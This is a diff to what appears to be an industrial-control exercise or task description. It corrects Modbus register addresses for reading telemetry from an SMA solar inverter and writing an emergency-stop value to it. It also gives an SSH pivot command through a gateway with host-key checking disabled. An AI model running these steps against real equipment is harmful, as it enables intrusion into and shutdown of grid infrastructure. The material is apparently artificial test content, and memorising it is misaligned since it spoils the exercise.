@@ -144,19 +144,19 @@ Write the value `1749` to register 40018 using **Function Code 16** (Write Multi
 **Recommended tooling** (any one is acceptable):
 - Python `pymodbus` (`pip install pymodbus`):
   ```python
-  # Read telemetry via SSH tunnel (FC04) — pymodbus uses 0-based addresses
-  result = client.read_input_registers(address=30200, count=2, slave=1)  # Operation.Health
-  result = client.read_input_registers(address=30516, count=4, slave=1)  # DyWhOut
-  result = client.read_input_registers(address=30774, count=2, slave=1)  # GridMs.TotW
+  # Read telemetry via SSH tunnel (FC04) — literal SMA register number is the wire address
+  result = client.read_input_registers(address=30201, count=2, slave=1)  # Operation.Health
+  result = client.read_input_registers(address=30517, count=4, slave=1)  # DyWhOut
+  result = client.read_input_registers(address=30775, count=2, slave=1)  # GridMs.TotW
 
   # Write E-Stop (FC16)
-  client.write_registers(address=40017, values=[0, 1749], slave=1)
+  client.write_registers(address=40018, values=[0, 1749], slave=1)
 
   # Verify (FC04)
-  result = client.read_input_registers(address=30200, count=2, slave=1)  # expect 35
-  result = client.read_input_registers(address=30774, count=2, slave=1)  # expect 0
+  result = client.read_input_registers(address=30201, count=2, slave=1)  # expect 35
+  result = client.read_input_registers(address=30775, count=2, slave=1)  # expect 0
   ```
-  Note: pymodbus uses 0-based addresses — subtract 1 from the register address shown in the table above.
+  Note: SMA devices use the literal register number as the raw Modbus wire address — do not subtract 1 or 40001.
 - CLI: `mbpoll -m tcp -p 502 -t 3:int -r 30201 -c 2 10.1.2.15` (FC04 read) and `mbpoll -m tcp -p 502 -t 4 -r 40018 -c 2 10.1.2.15 1 0 1749` (FC16 write).
 - For the SSH pivot: `ssh -i gateway_rsa -o BatchMode=yes -o StrictHostKeyChecking=no admin@10.1.1.10` followed by a SOCKS proxy or remote port forward as described in Prompt 4.
 
